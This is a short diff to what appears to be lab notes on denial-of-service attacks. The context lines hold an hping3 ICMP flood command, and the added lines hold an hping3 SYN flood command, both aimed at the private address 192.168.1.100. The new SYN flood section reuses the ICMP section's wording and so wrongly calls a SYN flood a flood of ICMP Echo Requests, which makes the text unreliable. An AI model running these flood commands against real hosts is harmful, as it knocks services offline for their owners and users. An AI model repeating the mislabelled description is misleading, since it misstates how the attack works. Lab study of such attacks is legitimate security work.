@@ -29,6 +29,19 @@ This attack floods the target with ICMP Echo Request packets (ping), consuming n
 
 hping3 --icmp --flood -d 120 192.168.1.100
 
+```
+
+### 2. **TCP SYN Flood (SYN Flood)**
+
+This attack floods the target with ICMP Echo Request packets (ping), consuming network resources.
+
+**Command used:**
+
+```bash
+
+sudo hping3 --flood --syn -p 80 192.168.1.100
+
+
 
 
 
